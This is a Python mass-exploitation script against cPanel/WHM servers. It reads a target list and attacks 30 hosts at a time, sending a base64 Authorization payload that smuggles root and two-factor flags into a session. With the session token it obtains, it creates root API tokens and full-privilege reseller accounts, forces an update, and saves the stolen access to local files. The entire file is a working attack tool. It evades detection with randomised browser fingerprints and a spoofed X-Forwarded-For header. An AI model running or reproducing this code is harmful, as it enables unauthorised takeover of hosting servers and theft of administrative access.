import json, os, sys, re, urllib.parse, requests, urllib3, random, string
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
from colorama import init
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
fr = Fore.RED
fg = Fore.GREEN
fw = Fore.WHITE

requests.packages.urllib3.disable_warnings()

headers_F0x = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}

def get_random_headers():
    try:
        country_profiles = {
            'US': {
                'timezone': random.choice(['EST', 'CST', 'MST', 'PST']),
                'lang': 'en-US,en;q=0.9',
                'geo': random.choice(['New York', 'California', 'Texas', 'Florida'])
            },
            'UK': {
                'timezone': random.choice(['GMT', 'BST']),
                'lang': 'en-GB,en;q=0.9',
                'geo': random.choice(['London', 'Manchester', 'Birmingham'])
            },
            'DE': {
                'timezone': 'CET',
                'lang': 'de-DE,de;q=0.9,en;q=0.8',
                'geo': random.choice(['Berlin', 'Munich', 'Hamburg'])
            },
            'FR': {
                'timezone': 'CET',
                'lang': 'fr-FR,fr;q=0.9,en;q=0.8',
                'geo': random.choice(['Paris', 'Lyon', 'Marseille'])
            },
            'JP': {
                'timezone': 'JST',
                'lang': 'ja-JP,ja;q=0.9,en;q=0.8',
                'geo': random.choice(['Tokyo', 'Osaka', 'Kyoto'])
            },
            'BR': {
                'timezone': 'BRT',
                'lang': 'pt-BR,pt;q=0.9,en;q=0.8',
                'geo': random.choice(['Sao Paulo', 'Rio de Janeiro'])
            },
            'IN': {
                'timezone': 'IST',
                'lang': 'en-IN,en;q=0.9,hi;q=0.8',
                'geo': random.choice(['Mumbai', 'Delhi', 'Bangalore'])
            },
            'RU': {
                'timezone': 'MSK',
                'lang': 'ru-RU,ru;q=0.9,en;q=0.8',
                'geo': random.choice(['Moscow', 'St. Petersburg'])
            },
            'CN': {
                'timezone': 'CST',
                'lang': 'zh-CN,zh;q=0.9,en;q=0.8',
                'geo': random.choice(['Beijing', 'Shanghai', 'Guangzhou'])
            },
            'AU': {
                'timezone': 'AEST',
                'lang': 'en-AU,en;q=0.9',
                'geo': random.choice(['Sydney', 'Melbourne', 'Brisbane'])
            }
        }
        country = random.choice(list(country_profiles.keys()))
        profile = country_profiles[country]

        browser_choice = random.random()
        if (browser_choice < 0.45):  # 45% Chrome
            chrome_versions = [
                '120.0.6099.130', '121.0.6167.85', '119.0.6045.159',
                '122.0.6261.57', '118.0.5993.88'
            ]
            version = random.choice(chrome_versions)
            major = version.split('.')[0]

            # OS-specific Chrome builds
            os_profiles = [
                'Windows NT 10.0; Win64; x64',
                'Windows NT 11.0; Win64; x64',
                'Macintosh; Intel Mac OS X 10_15_7',
                'Macintosh; Intel Mac OS X 13_6_2',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64'
            ]
            os_string = random.choice(os_profiles)

            user_agent = 'Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(
                os_string, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(major, major),
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in os_string else '"macOS"' if 'Mac' in os_string else '"Linux"',
                'Sec-Ch-Ua-Platform-Version': '"{}.0.0"'.format(random.randint(10, 15)),
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1'
            }

        elif (browser_choice < 0.70):  # 25% Firefox
            firefox_versions = ['121.0', '120.0.1', '119.0.1', '122.0', '118.0.2']
            version = random.choice(firefox_versions)

            os_profiles = [
                'Windows NT 10.0; Win64; x64',
                'Macintosh; Intel Mac OS X 10.15',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64; rv:' + version
            ]
            os_string = random.choice(os_profiles)

            user_agent = 'Mozilla/5.0 ({}) Gecko/20100101 Firefox/{}'.format(os_string, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1'
            }

        elif (browser_choice < 0.85):  # 15% Safari
            safari_versions = ['17.2.1', '17.1', '16.6.1', '17.0']
            version = random.choice(safari_versions)
            webkit = '605.1.15'
            mac_versions = ['10_15_7', '11_7_2', '12_6_2', '13_6_1']
            mac_version = random.choice(mac_versions)

            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X {}) AppleWebKit/{} (KHTML, like Gecko) Version/{} Safari/{}'.format(
                mac_version, webkit, version, webkit)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate'
            }

        else:  # 15% Edge
            edge_versions = ['120.0.2210.133', '121.0.2277.83', '119.0.2151.97']
            version = random.choice(edge_versions)
            major = version.split('.')[0]

            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36 Edg/{}'.format(
                major, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Microsoft Edge";v="{}"'.format(major, major),
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            }

        # Common headers for all browsers
        headers.update({
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', None]),
            'DNT': random.choice(['1', None]),
            'Pragma': random.choice(['no-cache', None])
        })
        # Advanced fingerprinting extras
        if random.random() < 0.3:
            headers['Viewport-Width'] = random.choice(['1920', '1366', '1440', '1536', '1280', '2560'])

        if random.random() < 0.2:
            headers['Device-Memory'] = random.choice(['8', '4', '16', '32'])

        if random.random() < 0.15:
            headers['X-Forwarded-For'] = '{}.{}.{}.{}'.format(random.randint(1, 255), random.randint(1, 255),
                                                              random.randint(1, 255), random.randint(1, 255))
        headers = {k: v for k, v in headers.items() if v is not None}
        return headers
    except:
        return headers_F0x

# pre-built base64 of:
#   root:x\r\nsuccessful_internal_auth_with_timestamp=9999999999\r\nuser=root\r\ntfa_verified=1\r\nhasroot=1
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

def passwrod_creator():
    try:
        lower = string.ascii_lowercase
        upper = string.ascii_uppercase
        num = string.digits
        symbols = '!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.'
        pwd = '{}{}{}{}'.format(lower, upper, num, symbols)
        temp = random.sample(pwd, 12)
        password = "".join(temp)
        SpecialSym = ['!', '#', '%', '^', '*', '_', '-', '=', '/', '?', '.']
        while(not any(char.isdigit() for char in password) or not any(char.isdigit() for char in password) or not any(char.isupper() for char in password) or not any(char in SpecialSym for char in password)):
            temp = random.sample(pwd, 12)
            password = "".join(temp)
        return '{}{}'.format(random_Fox(1), password)
    except:
        return False

def input_Fox(txt):
    try :
        if (sys.version_info[0] < 3): return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input().strip()
    except:
        pass

def mylist():
    try:
        try:
            target = open(sys.argv[1], 'r')
            return target
        except :
            yList = str(input_Fox('   Your List --> : '))
            if (not os.path.isfile(yList) and '.txt' not in yList):
                yList = '{}.txt'.format(yList)
            while (not os.path.isfile(yList)):
                print("\n   {}({}) File does not exist, You have to put your list in the same folder.\n".format(fr, yList))
                yList = str(input_Fox('   Your List --> : '))
            target = open(yList, 'r')
            return target
    except:
        return False

def domain_Fox2(site):
    site = str(site)
    if (site.startswith("http://")) : site = site.replace("http://", "")
    elif (site.startswith("https://")) : site = site.replace("https://", "")
    if ('www.' in site) : site = site.replace('www.', '')
    if (':' in site): site = site.rstrip().split(':')[0]
    if ('|' in site): site = site.rstrip().split('|')[0]
    if ('/' in site): site = site.rstrip().split('/')[0]
    return str(site)

def random_Fox(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def content_Fox(req):
    if (sys.version_info[0] < 3):
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def discover_canonical_host(domain, header):
    try:
        header.update({"Connection": "close"})
        r = requests.get(f"https://{domain}:2087/openid_connect/cpanelid", verify=False, allow_redirects=False, headers=header, timeout=15)
        loc = r.headers.get("Location", "")
        m = re.match(r"^https?://([^:/]+)", loc)
        return m.group(1)
    except:
        return domain

def make_session():
    s = requests.Session()
    s.verify = False
    return s

def stage1_preauth(req, header, domain, canonical):
    try:
        base = f"https://{domain}:2087"
        header.update({"Host": f"{canonical}:2087", "Connection": "close"})
        try: r = req.request("GET", f"{base}/login/", headers=header, verify=False, allow_redirects=False, timeout=10)
        except: r = req.request("GET", f"{base}/login/", headers=header, verify=False, allow_redirects=False, timeout=20)
        for k, v in r.raw.headers.items():
            if (k.lower() == "set-cookie" and v.startswith("whostmgrsession=")):
                cookie_value = v.split("=", 1)[1].split(";", 1)[0]
                cookie_value = urllib.parse.unquote(cookie_value)
                break
        if ("," in cookie_value): session_base = cookie_value.split(",", 1)[0]
        else: session_base = cookie_value
        return session_base
    except :
        return False

def stage2_inject(req, header, domain, canonical, session_base):
    try:
        base = f"https://{domain}:2087"
        cookie_enc = urllib.parse.quote(session_base)
        header.update({"Host": f"{canonical}:2087", "Connection": "close", "Authorization": f"Basic {PAYLOAD_B64}", "Cookie": f"whostmgrsession={cookie_enc}"})
        try: r = req.request("GET", f"{base}/", headers=header, verify=False, allow_redirects=False, timeout=15)
        except: r = req.request("GET", f"{base}/", headers=header, verify=False, allow_redirects=False, timeout=30)
        m = re.search(r"/(cpsess\d+)", r.headers.get("Location", ""))
        token = m.group(0)
        return token
    except:
        return False

def stage3_propagate(req, header, domain, canonical, session_base):
    try:
        base = f"https://{domain}:2087"
        cookie_enc = urllib.parse.quote(session_base)
        header.update({"Host": f"{canonical}:2087", "Connection": "close", "Cookie": f"whostmgrsession={cookie_enc}"})
        try: r = req.request("GET", f"{base}/scripts2/listaccts", headers=header, verify=False, allow_redirects=False, timeout=15)
        except: r = req.request("GET", f"{base}/scripts2/listaccts", headers=header, verify=False, allow_redirects=False, timeout=30)
        body = content_Fox(r)
        if (r.status_code == 401 and ("Token denied" in body or "WHM Login" in body)): return True
        return False
    except:
        return False

def stage4_verify(req, header, domain, canonical, session_base, token):
    try:
        base = f"https://{domain}:2087"
        cookie_enc = urllib.parse.quote(session_base)
        header.update({"Host": f"{canonical}:2087", "Connection": "close", "Cookie": f"whostmgrsession={cookie_enc}"})
        try: r = req.request("GET", f"{base}{token}/json-api/version", headers=header, verify=False, allow_redirects=False, timeout=15)
        except: r = req.request("GET", f"{base}{token}/json-api/version", headers=header, verify=False, allow_redirects=False, timeout=30)
        body = content_Fox(r)
        if ((r.status_code == 200 and '"version"' in body) or (r.status_code in (500, 503) and "License" in body)) : return True
        return False
    except:
        return False

def call_whm_api(req, header, domain, canonical, session_base, token, function, params):
    try:
        cookie_enc = urllib.parse.quote(session_base)
        header.update({"Host": f"{canonical}:2087", "Connection": "close", "Cookie": f"whostmgrsession={cookie_enc}"})
        qs = "api.version=1"
        try:
            for k, v in params.items():
                if v is None:
                    continue
                qs += f"&{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}"
        except:
            pass
        base = f"https://{domain}:2087{token}/json-api/{function}?{qs}"
        try: r = req.request("GET", base, headers=header, verify=False, allow_redirects=False, timeout=15)
        except: r = req.request("GET", base, headers=header, verify=False, allow_redirects=False, timeout=30)
        body = content_Fox(r)
        j = json.loads(body)
        return j
    except:
        return False

def WHM_add_Token_P(req, header, domain, canonical, session_base, token):
    try:
        name = random_Fox(3)
        addtoken = call_whm_api(req, header, domain, canonical, session_base, token, 'api_token_create', {"token_name": f"WHM-{name}"})
        return addtoken["data"]["token"]
    except :
        return False

def WHM_add_root(req, header, domain, canonical, session_base, token):
    try:
        name = random_Fox(8)
        pwd = passwrod_creator()
        addusr = call_whm_api(req, header, domain, canonical, session_base, token, 'createacct', {"username": name, "password": pwd, "reseller_without_domain": 1})
        if('domain" is a required argument.' in str(addusr)):
              name = random_Fox(8)
              pwd = '6m8oUS1Xu2khTPGa90'
              addusr = call_whm_api(req, header, domain, canonical, session_base, token, 'createacct', {"username": name, "domain": f"{name}.tempmail.ps", "password": pwd, "contactemail": f"{name}@tempmail.ps", "cpmod": "paper_lantern", "plan": "default"})
              addusr = call_whm_api(req, header, domain, canonical, session_base, token, 'setupreseller', {"user": name})
        addroot = call_whm_api(req, header, domain, canonical, session_base, token, 'setacls', {"reseller": name, "acl-all": 1})
        return f"{name}|{pwd}"
    except :
        return False

def WHM_UPdate(req, header, domain, canonical, session_base, token):
    try:
        update = call_whm_api(req, header, domain, canonical, session_base, token, 'start_cpanel_update', {"": ""})
        cookie_enc = urllib.parse.quote(session_base)
        header.update({"Host": f"{canonical}:2087", "Connection": "close", "Cookie": f"whostmgrsession={cookie_enc}"})
        base = f"https://{domain}:2087{token}/scripts/upcp2?force=1"
        r = req.request("GET", base, headers=header, verify=False, allow_redirects=False, timeout=30)
        body = content_Fox(r)
        return True
    except:
        return False

def exp(url):
    try:
        hd = get_random_headers()
        domain = (domain_Fox2(url.strip()))
        print(' {}-| {}'.format(fw, domain))
        canonical = discover_canonical_host(domain, hd)
        req = make_session()
        session_base = stage1_preauth(req, hd, domain, canonical)
        if(session_base is False): return False
        token = stage2_inject(req, hd, domain, canonical, session_base)
        if (token is False): return False
        stage3_propagate(req, hd, domain, canonical, session_base)
        ck = stage4_verify(req, hd, domain, canonical, session_base, token)
        if (ck is False): return False
        tk = WHM_add_Token_P(req, hd, domain, canonical, session_base, token)
        if (tk is False): return False
        print(' {}-| {}{} -> {}[Fucked]'.format(fg, fw, domain, fg))
        open('HOST-API-TOKEN.txt', 'a').write(f"https://{canonical}:2087|root|{tk}\n")
        open('Domain-API-TOKEN.txt', 'a').write(f"https://{domain}:2087|root|{tk}\n")
        rt = WHM_add_root(req, hd, domain, canonical, session_base, token)
        if(rt is False): pass
        else:
            open('HOST-RESELLER.txt', 'a').write(f"https://{canonical}:2087|{rt}\n")
            open('Domain-RESELLER.txt', 'a').write(f"https://{domain}:2087|{rt}\n")
        WHM_UPdate(req, hd, domain, canonical, session_base, token)
    except:
        pass

with ThreadPoolExecutor(max_workers=30) as ex:
    ex.map(exp, mylist())